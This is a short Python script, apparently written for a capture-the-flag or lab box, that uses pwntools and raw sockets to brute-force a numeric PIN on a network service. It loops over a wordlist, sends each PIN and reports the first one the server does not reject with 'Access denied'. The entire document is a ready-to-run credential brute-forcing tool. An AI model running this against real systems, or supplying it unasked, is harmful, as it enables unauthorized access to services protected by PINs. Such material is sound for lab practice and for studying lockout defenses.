import sys
import socket, pdb, time
from pwn import * 

# Menu help 
if len(sys.argv) == 0 or sys.argv[1] == '-h' or sys.argv[1] == '-help':
	print("Use mode: \n" + "-> python3 " + sys.argv[0] + " target-ip " + "port " + "wordlist.txt")
	print("\nExample: \n" + "-> python3 " + sys.argv[0] + " 10.10.10.1 " + "910 " + "wordlist.txt")
	sys.exit(1)


# Verify if the file was passed as an argument to the script
if len(sys.argv) < 4:
	print("Please specify the wordlist to use")
	sys.exit(1)


# Read variables from input
ip = sys.argv[1]
port = sys.argv[2]


#Progress bar
p1 = log.progress("Brute Force: ")


# Function for exiting the script
def signal_handler(sig, frame):
        print("\n\n[!] Exiting \n")
        sys.exit(0)


def bruteforce():
	file = open(sys.argv[3], 'r')
	for pin in file:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates the socket for the connection
		s.connect((ip, int(port))) #Connects to the host
		data = s.recv(4096)
		s.send(pin.encode())
		data = s.recv(4096)
		p1.status("Testing PIN: " + pin)
		if b"Access denied" not in data:
			print("PIN is: " + pin)
			sys.exit(0)




if __name__ == '__main__':
	bruteforce()
